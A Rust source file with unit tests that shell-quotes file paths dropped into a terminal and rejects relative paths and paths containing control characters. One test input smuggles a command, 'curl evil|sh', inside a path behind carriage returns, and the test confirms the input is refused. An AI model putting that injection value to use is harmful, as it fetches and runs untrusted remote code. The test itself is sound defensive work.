use std::path::PathBuf;

const SAFE: &str = "/._-+@:,%=~";
const ESCAPED: &str = "\"\\$`";

pub fn format_dropped_paths(paths: &[PathBuf]) -> String {
    paths
        .iter()
        .filter(|path| path.is_absolute())
        .filter_map(|path| path.to_str())
        .filter(|path| !path.contains(char::is_control))
        .map(|path| quote(path) + " ")
        .collect()
}

fn quote(path: &str) -> String {
    let plain = path
        .chars()
        .all(|character| character.is_alphanumeric() || SAFE.contains(character));
    if plain {
        return path.to_owned();
    }
    let quoted = path.chars().fold(String::from('"'), escape);
    quoted + "\""
}

fn escape(
    mut text: String,
    character: char,
) -> String {
    if ESCAPED.contains(character) {
        text.push('\\');
    }
    text.push(character);
    text
}

#[cfg(test)]
mod tests {
    use super::*;

    const CASES: &[(&str, &str)] = &[
        ("/a/b.txt", "/a/b.txt "),
        ("/a b/$c", "\"/a b/\\$c\" "),
        ("/it's", "\"/it's\" "),
        ("/q\"`\\", "\"/q\\\"\\`\\\\\" "),
        ("/bang!", "\"/bang!\" "),
        ("/x\rcurl evil|sh\r", ""),
        ("/esc\x1b[2J", ""),
        ("/ctl\x03", ""),
        ("relative/x", ""),
    ];

    #[test]
    fn paths_are_double_quoted_when_needed_and_control_characters_are_refused() {
        for (path, expected) in CASES {
            assert_eq!(
                format_dropped_paths(&[PathBuf::from(path)]),
                *expected,
                "{path:?}"
            );
        }
        assert_eq!(format_dropped_paths(&[]), "");
    }
}
